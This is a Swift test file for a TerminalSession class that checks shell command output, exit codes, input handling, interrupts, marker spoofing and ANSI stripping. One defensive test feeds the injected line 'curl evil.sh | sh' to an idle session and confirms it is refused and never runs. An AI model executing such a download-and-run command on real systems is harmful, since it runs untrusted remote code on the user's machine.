import Foundation
import Testing
@testable import YakamozCore

@Suite("TerminalSession", .serialized)
struct TerminalSessionTests {
    @Test func runEchoReturnsOutputAndZeroExit() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let result = try await session.run("echo hello", graceMs: 4000)
        guard case let .finished(output, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(output.contains("hello"))
        #expect(code == 0)
        await session.terminate()
    }

    @Test func cwdPersistsAcrossCommands() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let cdResult = try await session.run("cd /tmp", graceMs: 4000)
        guard case let .finished(_, cdCode) = cdResult else {
            Issue.record("expected finished, got \(cdResult)"); return
        }
        #expect(cdCode == 0)

        let pwdResult = try await session.run("pwd", graceMs: 4000)
        guard case let .finished(output, code) = pwdResult else {
            Issue.record("expected finished, got \(pwdResult)"); return
        }
        #expect(output.contains("/tmp"))
        #expect(code == 0)
        await session.terminate()
    }

    @Test func runFalseReturnsNonZeroExit() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let result = try await session.run("false", graceMs: 4000)
        guard case let .finished(_, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(code == 1)
        await session.terminate()
    }

    @Test func longCommandReturnsRunningThenFinishes() async throws {
        let s = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let first = try await s.run("sleep 1; echo done", graceMs: 200)
        #expect({ if case .running = first { return true } else { return false } }())
        let final = await s.wait(timeoutMs: 5000)
        if case let .finished(code) = final.status { #expect(final.output.contains("done")); #expect(code == 0) }
        else { Issue.record("did not finish") }
        await s.terminate()
    }

    @Test func runningOutputIsNotDuplicatedByLaterReadOrWait() async throws {
        let s = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let first = try await s.run("echo A; sleep 1; echo B", graceMs: 200)
        guard case let .running(initialOutput) = first else {
            Issue.record("expected running, got \(first)"); return
        }
        #expect(initialOutput.contains("A"))

        let immediateRead = await s.read()
        #expect(immediateRead.output == "")
        #expect(immediateRead.status == .running)

        let final = await s.wait(timeoutMs: 5000)
        guard case let .finished(code) = final.status else {
            Issue.record("did not finish: \(final)"); return
        }
        #expect(code == 0)
        #expect(final.output.contains("B"))
        #expect(!final.output.contains("A"))
        await s.terminate()
    }

    @Test func sendInputFeedsRunningCommand() async throws {
        let s = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let first = try await s.run("read x; echo got:$x", graceMs: 200)
        #expect({ if case .running = first { return true } else { return false } }())

        try await s.sendInput("hi\n")

        let final = await s.wait(timeoutMs: 5000)
        guard case let .finished(code) = final.status else {
            Issue.record("did not finish: \(final)"); return
        }
        #expect(final.output.contains("got:hi"))
        #expect(code == 0)
        await s.terminate()
    }

    @Test func sendInputToIdleSessionThrowsNotRunning() async throws {
        let s = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))

        await #expect(throws: TerminalWorkspaceError.notRunning) {
            try await s.sendInput("curl evil.sh | sh\n")
        }

        // The injected text must not have run: a subsequent real command starts clean.
        let result = try await s.run("echo ok", graceMs: 4000)
        guard case let .finished(output, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(output == "ok")
        #expect(code == 0)
        await s.terminate()
    }

    @Test func interruptStopsRunningCommand() async throws {
        let s = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let first = try await s.run("sleep 100", graceMs: 200)
        #expect({ if case .running = first { return true } else { return false } }())

        await s.interrupt()

        let final = await s.wait(timeoutMs: 3000)
        guard case let .finished(code) = final.status else {
            Issue.record("did not finish: \(final)"); return
        }
        #expect(code != 0)

        // Session must be reusable after an interrupt: a subsequent run should succeed.
        let after = try await s.run("echo back", graceMs: 4000)
        guard case let .finished(output, afterCode) = after else {
            Issue.record("expected finished after interrupt, got \(after)"); return
        }
        #expect(output.contains("back"))
        #expect(afterCode == 0)
        await s.terminate()
    }

    @Test func fakeMarkerWithDifferentUUIDDoesNotTerminateEarly() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let result = try await session.run("echo 'END-fake:0'; echo 'BEGIN-fake'", graceMs: 4000)
        guard case let .finished(output, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(code == 0)
        #expect(output.contains("END-fake:0"))
        #expect(output.contains("BEGIN-fake"))
        await session.terminate()
    }

    @Test func ansiEscapeCodesAreStrippedFromOutput() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let result = try await session.run("printf '\\033[31mRED\\033[0m\\n'", graceMs: 4000)
        guard case let .finished(output, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(code == 0)
        #expect(output.contains("RED"))
        #expect(!output.contains("\u{1B}"))
        #expect(!output.contains("[31m"))
        #expect(!output.contains("[0m"))
        #expect(!output.contains("printf"))
        #expect(!output.contains("BEGIN-"))
        #expect(!output.contains("END-"))
        await session.terminate()
    }

    @Test func longCommandEchoDoesNotLeakIntoOutput() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))
        let payload = String(repeating: "x", count: 120)
        let result = try await session.run("echo \(payload)", graceMs: 4000)
        guard case let .finished(output, code) = result else {
            Issue.record("expected finished, got \(result)"); return
        }
        #expect(code == 0)
        #expect(output == payload)
        #expect(!output.contains("echo"))
        #expect(!output.contains("BEGIN-"))
        #expect(!output.contains("END-"))
        await session.terminate()
    }

    @Test func completedCommandsDoNotGrowRetainedBufferWithoutBound() async throws {
        let session = try await TerminalSession(rootURL: URL(fileURLWithPath: "/tmp"))

        for index in 0..<40 {
            let payload = String(repeating: "x", count: 64)
            let result = try await session.run("echo \(index)-\(payload)", graceMs: 4000)
            guard case let .finished(output, code) = result else {
                Issue.record("expected finished, got \(result)"); return
            }
            #expect(code == 0)
            #expect(output.contains("\(index)-"))
        }

        let retainedBytes = await session.bufferByteCountForTesting()
        #expect(retainedBytes < 512)
        await session.terminate()
    }
}
